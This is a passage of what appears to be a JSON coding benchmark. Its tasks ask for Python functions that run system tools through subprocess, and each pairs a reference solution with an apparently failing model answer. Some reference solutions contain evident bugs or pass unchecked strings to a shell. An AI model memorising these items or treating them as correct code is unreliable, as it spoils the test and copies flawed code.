    "wrong_result": "class PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        cmd = ['ps', '-eo', '%mem,comm,args']\n        if self.config.get('sudo_flag', False):\n            cmd = ['sudo'] + cmd\n        result = subprocess.run(cmd, capture_output=True, text=True, check=True)\n        output = result.stdout\n        lines = output.splitlines()[1:]\n        processes = []\n        total_mem = 0\n        for line in lines:\n            parts = line.split()\n            if len(parts) < 3:\n                continue\n            mem_percent = float(parts[0])\n            comm = parts[1]\n            if comm in ['apache2', 'nginx', 'passenger']:\n                processes.append({'mem': mem_percent, 'comm': comm})\n                total_mem += mem_percent\n        return {'processes': processes, 'total_mem': total_mem}\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        total_cpu = 0\n        for proc in dict_stats.get('processes', []):\n            total_cpu += proc.get('cpu', 0)\n        return total_cpu\n\n    def get_passenger_queue_stats(self):\n        cmd = ['passenger', 'status']\n        if self.config.get('sudo_flag', False):\n            cmd = ['sudo'] + cmd\n        result = subprocess.run(cmd, capture_output=True, text=True, check=True)\n        output = result.stdout\n        top_level = 0\n        app_queues = 0\n        for line in output.splitlines():\n            if 'Top-level queues:' in line:\n                top_level = int(line.split()[-1])\n            elif 'Application queues:' in line:\n                app_queues = int(line.split()[-1])\n        return {'top_level': top_level, 'app_queues': app_queues}"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Python class that collects and parses statistics from the amavisd-agent program using subprocess communication.\n\nClass Description: The AmavisCollector class is designed to interface with the amavisd-agent program to collect mail processing statistics. It uses subprocess.PIPE to communicate with the agent process and regular expressions to parse the output. The class supports optional sudo execution for privilege escalation.\n\nAttributes:\n\nmatchers: [List[re.Pattern]] - A list of compiled regular expressions used to parse different formats of statistics from amavisd-agent output.\nconfig: [Dict[str, Any]] - Configuration dictionary containing paths to executables and sudo settings.\n\nMethods:\n\n__init__: [Name](amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis') -> None - Initializes the collector with configuration parameters for the amavisd-agent executable and optional sudo settings.\ncollect: [Name]() -> Generator[Tuple[str, str, str], None, None] - Executes the amavisd-agent process, captures its output, and yields parsed statistics as tuples of (metric_name, metric_type, value). Raises an exception if the process cannot be executed.",
    "Canonical_solution": "import os\nimport subprocess\nimport re\n\nclass AmavisCollector:\n    matchers = [\n        re.compile(r'^\\s*(?P<name>[\\w]+)\\s+(?P<time>[\\d]+) s\\s+'\n                   r'(?P<frequency>[\\d.]+) s/msg\\s+\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<count>[\\d]+)\\s+'\n                   r'(?P<frequency>[\\d.]+)/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<size>[\\d]+)MB\\s+'\n                   r'(?P<frequency>[\\d.]+)MB/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n    ]\n\n    def __init__(self, amavisd_exe='/usr/sbin/amavisd-agent', use_sudo=False, sudo_exe='/usr/bin/sudo', sudo_user='amavis'):\n        self.config = {\n            'amavisd_exe': amavisd_exe,\n            'use_sudo': use_sudo,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user\n        }\n\n    def collect(self):\n        try:\n            if self.config['use_sudo']:\n                cmdline = [\n                    self.config['sudo_exe'], '-u', self.config['sudo_user'],\n                    '--', self.config['amavisd_exe'], '-c', '1'\n                ]\n            else:\n                cmdline = [self.config['amavisd_exe'], '-c', '1']\n                \n            agent = subprocess.Popen(cmdline, stdout=subprocess.PIPE)\n            agent_out = agent.communicate()[0]\n            lines = agent_out.strip().split(os.linesep)\n            \n            for line in lines:\n                for rex in self.matchers:\n                    res = rex.match(line)\n                    if res:\n                        groups = res.groupdict()\n                        name = groups['name']\n                        for metric, value in groups.items():\n                            if metric == 'name':\n                                continue\n                            yield (name, metric, value)\n\n        except OSError as err:\n            raise Exception(f\"Could not run {self.config['amavisd_exe']}: {err}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import re\nimport subprocess\nfrom typing import List, Dict, Any, Generator, Tuple\n\nclass AmavisCollector:\n    def __init__(self, amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis'):\n        self.amavisd_exe = amavisd_exe\n        self.use_sudo = use_sudo\n        self.sudo_exe = sudo_exe\n        self.sudo_user = sudo_user\n        self.config = {\n            'amavisd_exe': amavisd_exe,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user,\n            'use_sudo': use_sudo,\n        }\n        self.matchers = [\n            re.compile(r'^Total messages processed: (\\d+)$'),\n            re.compile(r'^Spam detected: (\\d+)$'),\n            re.compile(r'^Virus detected: (\\d+)$'),\n            re.compile(r'^Total spam messages: (\\d+)$'),\n            re.compile(r'^Total virus messages: (\\d+)$'),\n            re.compile(r'^Total unknown messages: (\\d+)$'),\n        ]\n        self._matcher_info = [\n            (self.matchers[0], 'total_messages_processed', 'count'),\n            (self.matchers[1], 'spam_detected', 'count'),\n            (self.matchers[2], 'virus_detected', 'count'),\n            (self.matchers[3], 'total_spam_messages', 'count'),\n            (self.matchers[4], 'total_virus_messages', 'count'),\n            (self.matchers[5], 'total_unknown_messages', 'count'),\n        ]\n\n    def collect(self) -> Generator[Tuple[str, str, str], None, None]:\n        if self.use_sudo:\n            cmd = [self.sudo_exe, '-u', self.sudo_user, self.amavisd_exe]\n        else:\n            cmd = [self.amavisd_exe]\n        \n        try:\n            result = subprocess.run(\n                cmd,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                text=True,\n                check=True\n            )\n        except subprocess.CalledProcessError as e:\n            raise RuntimeError(f\"Failed to execute amavisd-agent: {e.stderr}\")\n        \n        for line in result.stdout.splitlines():\n            for pattern, metric_name, metric_type in self._matcher_info:\n                match = pattern.match(line)\n                if match:\n                    value = match.group(1)\n                    yield (metric_name, metric_type, value)\n                    break  # Break to avoid multiple yields per line"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module and returns the output.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the standard output, and return it as a string. The function should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: str - A string representing the system command to be executed\n\nOutput:\n- str - The decoded standard output from the executed command",
    "Canonical_solution": "import urllib.request\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    statusofssh = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef execute_command(com):\n    result = subprocess.run(com, capture_output=True, text=True)\n    return result.stdout"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: The task involves creating Python functions for executing system commands and processing their output through inter-process communication (IPC) using pipes. The functions should handle command execution, output decoding, and temporary file management for command processing.\n\nFunction Description: The provided functions enable executing system commands through subprocesses, capturing and decoding their output, and processing text data through temporary files when needed. The functions handle Windows-specific configurations and character encoding.\n\nInput:\n- For run_and_read(view, cmd):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - cmd: [str] - The command string to execute via cmd.exe\n\n- For filter_region(view, txt, command):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - txt: [str] - The text content to process\n  - command: [str] - The command to process the text with\n\n- For get_startup_info() and get_oem_cp(): No input parameters\n\nOutput:\n- For run_and_read(): [str] - The decoded output from the command execution\n- For filter_region(): [str] - The processed text output from the command\n- For get_startup_info(): [subprocess.STARTUPINFO] - Windows process startup configuration\n- For get_oem_cp(): [str] - The OEM code page identifier as a string",
    "Canonical_solution": "import subprocess\nfrom subprocess import PIPE\nimport os\nimport tempfile\nimport ctypes\n\ndef get_startup_info():\n    startupinfo = subprocess.STARTUPINFO()\n    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    return startupinfo\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen(['cmd.exe', '/c', cmd],\n                                stdout=PIPE,\n                                stderr=PIPE,\n                                shell=True,\n                                startupinfo=get_startup_info()).communicate()\n    try:\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, txt, command):\n    try:\n        contents = tempfile.NamedTemporaryFile(suffix='.txt', delete=False)\n        contents.write(txt.encode('utf-8'))\n        contents.close()\n\n        script = tempfile.NamedTemporaryFile(suffix='.bat', delete=False)\n        script.write(('@echo off\\ntype %s | %s' % (contents.name, command)).encode('utf-8'))\n        script.close()\n\n        p = subprocess.Popen([script.name],\n                             stdout=PIPE,\n                             stderr=PIPE,\n                             startupinfo=get_startup_info())\n\n        out, err = p.communicate()\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')[:-1].strip()\n    finally:\n        os.remove(script.name)\n        os.remove(contents.name)\n\ndef get_oem_cp():\n    codepage = ctypes.windll.kernel32.GetOEMCP()\n    return str(codepage)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport ctypes\n\ndef get_startup_info():\n    return subprocess.STARTUPINFO()\n\ndef get_oem_cp():\n    return str(ctypes.windll.kernel32.GetOEMCP())\n\ndef run_and_read(view, cmd):\n    oem_code_page = get_oem_cp()\n    result = subprocess.run(\n        ['cmd.exe', '/c', cmd],\n        capture_output=True,\n        text=False,\n        check=True\n    )\n    return result.stdout.decode(oem_code_page)\n\ndef filter_region(view, txt, command):\n    oem_code_page = get_oem_cp()\n    result = subprocess.run(\n        ['cmd.exe', '/c', command],\n        input=txt,\n        capture_output=True,\n        text=False,\n        check=True\n    )\n    return result.stdout.decode(oem_code_page)"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a class that interacts with partclone utility to retrieve and parse partition information from disk image files, handling potential compression and chaining multiple subprocesses together.\n\nClass Description: The Partclone class provides static methods for working with partclone disk images, particularly focused on extracting partition information through a chain of subprocess operations.\n\nMethods:\n\nMethod1: get_partclone_info_dict(abs_partclone_image_list: list, image_key: str, compression: str) -> dict - Retrieves partition information from partclone image files by executing a chain of subprocess commands (cat, decompression, and partclone.info). Returns a dictionary containing parsed partition information.\n\nInput:\n- abs_partclone_image_list: List of absolute paths to partclone image files\n- image_key: String identifier for the image\n- compression: String specifying compression type (used for decompression)\n\nOutput:\n- Dictionary containing parsed partition information, with 'filesystem' as a minimum key (set to \"<unknown>\" if parsing fails)\n\nMethod2: parse_partclone_info_output(output: str) -> dict - [Implied but not shown in code] Parses the output string from partclone.info command into a structured dictionary. This would be a helper method called by get_partclone_info_dict.\n\nInput:\n- output: String containing the raw output from partclone.info command\n\nOutput:\n- Dictionary containing structured partition information extracted from the output",
    "Canonical_solution": "import collections\nimport subprocess\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list, image_key, compression):\n        env = utility.Utility.get_env_C_locale()\n        proc = collections.OrderedDict()\n        cat_cmd_list = [\"cat\"] + abs_partclone_image_list\n        decompression_cmd_list = utility.Utility.get_decompression_command_list(compression)\n        partclone_info_cmd_list = [\"partclone.info\", \"--source\", \"-\"]\n        utility.Utility.print_cli_friendly(\"partclone \", [cat_cmd_list, decompression_cmd_list, partclone_info_cmd_list])\n        proc['cat_partclone' + image_key] = subprocess.Popen(cat_cmd_list, stdout=subprocess.PIPE, env=env,\n                                                                          encoding='utf-8')\n        proc['decompression' + image_key] = subprocess.Popen(decompression_cmd_list,\n                                                                          stdin=proc[\n                                                                              'cat_partclone' + image_key].stdout,\n                                                                          stdout=subprocess.PIPE, env=env, encoding='utf-8')\n        proc['partclone_info' + image_key] = subprocess.Popen(partclone_info_cmd_list,\n                                                                           stdin=proc[\n                                                                               'decompression' + image_key].stdout,\n                                                                           stdout=subprocess.PIPE,\n                                                                           stderr=subprocess.PIPE, env=env,\n                                                                           encoding='utf-8')\n        proc['cat_partclone' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        proc['decompression' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        output, err = proc['partclone_info' + image_key].communicate()\n        print(\"partclone_info: Exit output \" + str(output) + \"stderr \" + str(err))\n        partclone_info_dict = Partclone.parse_partclone_info_output(err)\n        if len(partclone_info_dict) == 0:\n            print(abs_partclone_image_list[0] + \": Could not read partclone info dict for \" + image_key + \". Treating it as a dd image.\")\n            partclone_info_dict['filesystem'] = \"<unknown>\"\n        return partclone_info_dict",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list, image_key, compression):\n        result = {}\n        for image_path in abs_partclone_image_list:\n            decompress_cmd = []\n            if compression == 'gzip':\n                decompress_cmd = ['zcat', image_path]\n            elif compression == 'bzip2':\n                decompress_cmd = ['bunzip2', image_path]\n            elif compression == 'none':\n                decompress_cmd = [image_path]\n            else:\n                raise ValueError(f\"Unsupported compression: {compression}\")\n            \n            command = ' '.join(decompress_cmd) + ' | partclone.info'\n            try:\n                output = subprocess.check_output(command, shell=True, text=True)\n            except subprocess.CalledProcessError:\n                result[image_key] = {'filesystem': '<unknown>'}\n                continue\n            \n            parsed = Partclone._parse_partclone_info_output(output)\n            result[image_key] = parsed\n        return result\n    \n    @staticmethod\n    def _parse_partclone_info_output(output):\n        parsed = {}\n        lines = output.strip().split('\\n')\n        for line in lines:\n            if line.startswith('Partition'):\n                parts = line.split(': ')\n                if len(parts) < 2:\n                    continue\n                partition_line = parts[1].strip()\n                items = partition_line.split(', ')\n                for item in items:\n                    key, value = item.split('=')\n                    parsed[key.strip()] = value.strip()\n        if 'filesystem' not in parsed:\n            parsed['filesystem'] = '<unknown>'\n        return parsed"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: The task involves creating a function that executes a command in a subprocess, captures its output, and extracts specific metrics from the output for analysis.\n\nFunction Description: The function `run_gpt` executes a given command as a subprocess, captures its standard output and error streams, and parses the output to extract metrics such as runtime, number of parameters, and success status. It then returns these metrics along with any error messages.\n\nInput: \n- `cmd` (str): A string representing the command to be executed in the subprocess.\n\nOutput: \n- A tuple containing:\n  - `runtime` (float): The average iteration time extracted from the output.\n  - `num_params` (float): The number of parameters in billions, rounded to 3 decimal places.\n  - `success` (bool): A boolean indicating whether the test was successful based on a predefined success message.\n  - `errs` (bytes): The error output from the subprocess.",
    "Canonical_solution": "import subprocess\nfrom apex.transformer.testing.commons import TEST_SUCCESS_MESSAGE\n\ndef run_gpt(cmd):\n    args = list(cmd.split(\" \"))\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    outs, errs = p.communicate()\n    outs = list(str((outs).decode(\"utf-8\")).splitlines())\n    success = False\n    runtime = 0\n    num_params = 0\n    for out in outs:\n        out = str(out)\n        if \"Average Iteration Time:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                runtime = float(slicey)\n            except:\n                print(slicey)\n                quit()\n        if \"Number of Parameters:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                num_params = int(slicey)\n            except:\n                print(slicey)\n                quit()\n        if str(out) == str(TEST_SUCCESS_MESSAGE):\n            success = True\n    return runtime, round(float(int(num_params)) / 10.0 ** 9, 3), success, errs",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "def run_gpt(cmd):\n    import subprocess\n    result = subprocess.run(cmd, capture_output=True, text=True)\n    stdout = result.stdout\n    stderr = result.stderr\n    success = \"Test completed successfully\" in stdout\n    runtime = 0.0\n    num_params = 0.0\n\n    for line in stdout.split('\\n'):\n        if \"average iteration time\" in line:\n            parts = line.split()\n            runtime = float(parts[-1])\n        if \"number of parameters\" in line:\n            parts = line.split()\n            num_params = float(parts[-1]) / 1e9\n            num_params = round(num_params, 3)\n\n    return (runtime, num_params, success, stderr.encode())"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Write a Python function that queries DNS information for a given domain using the `dig` command, with options for TCP protocol and IPv6.\n\nFunction Description: The function `query_domain` executes a DNS query using the `dig` command-line tool. It retrieves the CNAME and IP address for the specified domain, with configurable query type and DNS server. The function supports TCP protocol and IPv6 queries. It parses the output to extract the first valid CNAME and IP address.\n\nInput:\n- `domain`: [str] - The domain name to query\n- `tcp`: [bool] - Whether to use TCP protocol for the DNS query (default: False)\n- `config`: [dict] - Configuration dictionary containing:\n  - `querytype`: [str] - DNS query type (e.g., 'A', 'AAAA')\n  - `dns`: [str] - DNS server address to query\n\nOutput:\n- [tuple] - A tuple containing:\n  - First valid CNAME found (str), empty string if none\n  - First valid IP address found (str), empty string if none",
    "Canonical_solution": "import subprocess\nimport shlex\n\ndef query_domain(domain, tcp):\n    cmd = \"dig +short +time=2 -6 %s @'%s' '%s'\"\\\n        % (config['querytype'], config['dns'], domain)\n\n    if tcp:\n        cmd = cmd + ' +tcp'\n\n    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)\n    out, _ = proc.communicate()\n    outarr = out.decode('utf-8').splitlines()\n\n    cname = ip = ''\n    for v in outarr:\n        if cname == '' and validate_domain(v[:-1]):\n            cname = v[:-1]\n        if ip == '' and validate_ip_addr(v):\n            ip = v\n            break\n\n    return (cname, ip)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import re\nimport subprocess\n\ndef query_domain(domain, tcp=False, config=None):\n    if config is None:\n        config = {}\n    querytype = config.get('querytype', 'A')\n    dns = config.get('dns', '8.8.8.8')\n\n    command = ['dig']\n    if tcp:\n        command.append('+tcp')\n    command.append(f'@{dns}')\n    command.append(domain)\n    command.append(querytype)\n\n    result = subprocess.run(command, capture_output=True, text=True)\n    output = result.stdout\n\n    cname = ''\n    ip = ''\n    cnames = []\n    ips = []\n    found_answer = False\n\n    for line in output.splitlines():\n        if line.startswith(';; ANSWER SECTION:'):\n            found_answer = True\n        elif found_answer:\n            cname_match = re.match(r'^(\\S+)\\s+\\d+\\s+IN\\s+CNAME\\s+(\\S+)', line)\n            if cname_match:\n                cnames.append(cname_match.group(2))\n            a_match = re.match(r'^(\\S+)\\s+\\d+\\s+IN\\s+A\\s+(\\S+)', line)\n            aaa_match = re.match(r'^(\\S+)\\s+\\d+\\s+IN\\s+AAAA\\s+(\\S+)', line)\n            if a_match:\n                ips.append(a_match.group(2))\n            if aaa_match:\n                ips.append(aaa_match.group(2))\n\n    if cnames:\n        cname = cnames[0]\n    if ips:\n        ip = ips[0]\n\n    return (cname, ip)"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Convert HTML content to plain text using external command-line tools through subprocess communication.\n\nFunction Description: The function converts HTML data to plain text using either 'lynx' or 'html2text' command-line tools. It handles process creation, input/output communication via pipes, and result processing. The function supports additional options for the conversion tools and ensures proper character encoding.\n\nInput:\n- data: [str] - The HTML content to be converted\n- baseurl: [str] - Base URL for relative links (unused in current implementation)\n- method: [str] - Conversion method ('lynx' or 'html2text')\n- options: [dict] - Additional options to pass to the conversion tool (key-value pairs where value can be None for flag options)\n\nOutput:\n- [str] - The converted plain text content with formatting cleaned up",
    "Canonical_solution": "import re\nimport os\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\n\ndef html2text(data, baseurl, method, options):\n    if method == 'lynx':\n        cmd = ['lynx', '-nonumbers', '-dump', '-stdin', '-assume_charset UTF-8', '-display_charset UTF-8']\n    elif method == 'html2text':\n        if '-utf8' in subprocess.check_output(['html2text', '-help'], encoding='utf-8'):\n            cmd = ['html2text', '-nobs', '-utf8']\n        else:\n            cmd = ['html2text', '-nobs']\n    else:\n        raise ValueError('Unknown html2text method: %r' % (method,))\n\n    stdout_encoding = 'utf-8'\n\n    for k, v in options.items():\n        if v is not None:\n            cmd.extend(['-{}'.format(k), '{}'.format(v)])\n        else:\n            cmd.append('-{}'.format(k))\n\n    logger.debug('Command: %r, stdout encoding: %s', cmd, stdout_encoding)\n\n    env = {}\n    env.update(os.environ)\n    env['LANG'] = 'en_US.utf-8'\n    env['LC_ALL'] = 'en_US.utf-8'\n\n    html2text = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, env=env)\n    stdout, stderr = html2text.communicate(data.encode('utf-8'))\n    stdout = stdout.decode(stdout_encoding)\n\n    if method == 'lynx':\n        stdout = re.sub(r'file://%s/[^/]*/' % (os.environ.get('TMPDIR', '/tmp'),), '', stdout)\n        stdout = re.sub(r'file://localhost%s/[^/]*/' % (os.environ.get('TMPDIR', '/tmp'),), '', stdout)\n        stdout = re.sub(r'L\\d+-\\d+TMP.html', '', stdout)\n\n    return stdout.strip()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef html_to_text(data, baseurl, method, options):\n    if method == 'lynx':\n        cmd = ['lynx', '-dump', '-stdin']\n    elif method == 'html2text':\n        cmd = ['html2text', '-width', '0', '-platform', 'linux']\n    else:\n        raise ValueError(\"Invalid method\")\n    \n    for key, value in options.items():\n        if value is None:\n            cmd.append('--' + key)\n        else:\n            cmd.append(key)\n            cmd.append(value)\n    \n    try:\n        result = subprocess.run(\n            cmd,\n            input=data.encode('utf-8'),\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True,\n            check=True\n        )\n        return result.stdout\n    except subprocess.CalledProcessError:\n        return \"\""
  },
  {
    "Task_id": 310,
    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute ffprobe (a multimedia stream analyzer) on a specified file and return the output in JSON format.\n\nFunction Description: The function _probe executes ffprobe command-line tool to analyze a multimedia file, capturing its format and stream information. It uses subprocess.Popen with pipes to handle inter-process communication, converts the output to JSON, and handles errors if the process fails.\n\nInput:\n- filename: [str] - Path to the multimedia file to analyze\n- cmd: [str] (optional, default=\"ffprobe\") - Name/path of the ffprobe executable\n- timeout: [int/float] (optional) - Timeout in seconds for the subprocess\n- **kwargs: [dict] (optional) - Additional ffprobe command-line arguments\n\nOutput:\n- [dict] - Parsed JSON output containing multimedia file information\n- Raises ffmpeg.Error if the process returns a non-zero exit code (includes stderr in exception)",
    "Canonical_solution": "import json\nimport subprocess\nimport ffmpeg\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    \"\"\"Run ffprobe on the specified file and return a JSON representation of the output.\n\n    Raises:\n        :class:`ffmpeg.Error`: if ffprobe returns a non-zero exit code,\n            an :class:`Error` is returned with a generic error message.\n            The stderr output can be retrieved by accessing the\n            ``stderr`` property of the exception.\n    \"\"\"\n    args = [cmd, \"-show_format\", \"-show_streams\", \"-of\", \"json\"]\n    args += ffmpeg._utils.convert_kwargs_to_cmd_line_args(kwargs)\n    args += [filename]\n\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    communicate_kwargs = {}\n    if timeout is not None:\n        communicate_kwargs[\"timeout\"] = timeout\n    out, err = p.communicate(**communicate_kwargs)\n    if p.returncode != 0:\n        raise ffmpeg.Error(\"ffprobe\", out, err)\n    return json.loads(out.decode(\"utf-8\"))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport json\nfrom ffmpeg import Error\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    command = [cmd]\n    command.extend([\"-v\", \"error\", \"-show_format\", \"-show_streams\"])\n    for key, value in kwargs.items():\n        command.append(key)\n        command.append(value)\n    command.append(filename)\n\n    proc = subprocess.Popen(\n        command,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n\n    try:\n        stdout, stderr = proc.communicate(timeout=timeout)\n    except subprocess.TimeoutExpired:\n        proc.kill()\n        stdout, stderr = proc.communicate()\n        raise Error(f\"Command timed out: {stderr}\")\n\n    if proc.returncode != 0:\n        raise Error(f\"FFprobe failed with exit code {proc.returncode}: {stderr}\")\n\n    try:\n        return json.loads(stdout)\n    except json.JSONDecodeError:\n        raise Error(f\"Invalid JSON output: {stdout}\")"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Implement a set of utility functions for executing shell commands in Python using subprocess.PIPE for inter-process communication, with options for real-time output display and logging.\n\nFunction Description: The functions provide different ways to execute shell commands and handle their output:\n1. run_command - Executes a command and collects all output lines\n2. run_shell_display - Executes a command and displays output in real-time\n3. run_shell - Executes a command and logs output to a file\n\nInput:\n- For run_command: cmd [str] - The shell command to execute\n- For run_shell_display: cmd [str] - The shell command to execute\n- For run_shell: cmd [str] - The shell command to execute, log_file [str] - Path to log file\n\nOutput:\n- For run_command: [str] - Combined stdout/stderr output\n- For run_shell_display: None (output is displayed in real-time)\n- For run_shell: [bytes] - Raw command output (also written to log file)",
    "Canonical_solution": "import subprocess\n\ndef run_command(cmd):\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    stdout = []\n    while True:\n        line = p.stdout.readline()\n        stdout.append(line)\n        print(line.decode(\"utf-8\"))\n        if line == \"\" and p.poll() != None:\n            break\n    return \"\".join(stdout)\n\ndef run_shell_display(cmd):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    while True:\n        out = p.stdout.read(1).decode(\"utf-8\")\n        if out == \"\" and p.poll() != None:\n            break\n        if out != \"\":\n            sys.stdout.write(out)\n            sys.stdout.flush()\n    return\n\ndef run_shell(cmd, log_file):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    (output, err) = p.communicate()\n    p.wait()\n    with open(log_file, \"a+\") as logfile:\n        logfile.write(output.decode(\"utf-8\") + \"\\n\")\n        logfile.write(err.decode(\"utf-8\") + \"\\n\")\n    return output",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef run_command(cmd):\n    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)\n    combined = result.stdout + result.stderr\n    return combined.splitlines()\n\ndef run_shell_display(cmd):\n    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    while True:\n        retcode = process.poll()\n        if retcode is not None:\n            break\n        out_line = process.stdout.readline()\n        if out_line:\n            print(out_line.strip())\n        err_line = process.stderr.readline()\n        if err_line:\n            print(err_line.strip())\n\ndef run_shell(cmd, log_file):\n    result = subprocess.run(cmd, capture_output=True, text=False, shell=True)\n    with open(log_file, 'wb') as f:\n        f.write(result.stdout)\n        f.write(result.stderr)\n    return result.stdout + result.stderr"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a function that executes a system command in a specified working directory and handles the command's output and errors.\n\nFunction Description: The function `run_command` executes a given system command in a specified working directory using Python's `subprocess` module. It captures the command's standard output and error streams, decodes them, and prints them. If the command returns a non-zero exit code, it raises a `CalledProcessError`.\n\nInput:  \n- `command`: [str] - The system command to be executed.  \n- `working_dir`: [str] - The working directory where the command will be executed.  \n\nOutput:  \n- None (prints output/error messages directly). Raises `subprocess.CalledProcessError` if the command fails (non-zero exit code).",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef run_command(command, working_dir):\n    command_array = command.split(\" \")\n    process = subprocess.Popen(command_array, cwd=working_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if stdout:\n        print(stdout.decode('utf-8'))\n    if stderr:\n        print(stderr.decode('utf-8'), level=\"error\")\n    if process.returncode != 0:\n        raise subprocess.CalledProcessError(process.returncode, command)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef run_command(command, working_dir):\n    cmd = command.split()\n    result = subprocess.run(cmd, cwd=working_dir, capture_output=True, text=True)\n    if result.returncode != 0:\n        raise subprocess.CalledProcessError(result.returncode, command)\n    print(\"Output:\", result.stdout)\n    print(\"Error:\", result.stderr)"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local client and a remote server, handling socket connections, data encryption, and protocol obfuscation.\n\nClass Description: The TCPRelayHandler class is responsible for managing the relay of TCP traffic between a local client and a remote server. It handles socket creation, connection management, data encryption/decryption, and protocol obfuscation. The class integrates with an event loop for asynchronous I/O operations.\n\nAttributes:\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to handler instances\n- _loop: [object] - Event loop instance for I/O multiplexing\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket (IPv4)\n- _remote_sock_v6: [socket.socket] - Remote server socket (IPv6)\n- _remote_udp: [bool] - Flag indicating UDP mode\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating local mode\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption handler\n- _encrypt_correct: [bool] - Encryption status flag\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _fastopen_connected: [bool] - TCP Fast Open status\n- _data_to_write_to_local: [list] - Buffer for data to local client\n- _data_to_write_to_remote: [list] - Buffer for data to remote server\n- _udp_data_send_buffer: [bytes] - UDP data buffer\n- _upstream_status: [int] - Upstream connection status\n- _downstream_status: [int] - Downstream connection status\n- _client_address: [tuple] - Local client address\n- _remote_address: [tuple] - Remote server address\n- _forbidden_iplist: [list] - List of blocked IP addresses\n- _chosen_server: [object] - Selected server 